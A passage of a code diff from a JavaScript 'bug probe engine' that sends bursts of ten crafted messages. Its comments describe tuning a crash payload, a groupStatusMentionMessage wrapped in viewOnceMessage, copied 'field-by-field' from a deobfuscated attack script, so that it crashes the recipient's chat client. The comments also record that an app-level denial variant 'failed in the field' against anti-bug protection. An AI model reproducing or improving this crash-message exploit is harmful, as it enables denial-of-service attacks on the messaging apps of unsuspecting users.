@@ -164,13 +164,13 @@ export function createBugProbeEngine(deps) {
         let sent = 0, firstWireBytes = 0, ids = [];
         for (let i = 0; i < 10; i++) {
             const payload = {
-                // App-level envelope (same class as crash-hard's groupStatus
-                // pipeline): poisons the app's startup/sync path instead of the
-                // chat-render path, converting the hybrid from a chat-level
-                // crash-on-open into a total app-level denial. The original
-                // fvckb1tch used viewOnceMessage (chat-level) — viewOnce version
-                // remains in git history if the comparison is ever needed.
-                groupStatusMessageV2: {
+                // EXACT Squichy fvckb1tch envelope (verified field-by-field
+                // against the deobfuscated case.js): viewOnceMessage wrapper.
+                // A groupStatusMessageV2 envelope was tried as an "app-level"
+                // experiment and FAILED in the field (antibug withstood it) —
+                // the groupStatusMentionMessage association only detonates in
+                // the client's render path when it rides viewOnceMessage.
+                viewOnceMessage: {
                     message: {
                         groupStatusMentionMessage: {
                             messageAssociation: {
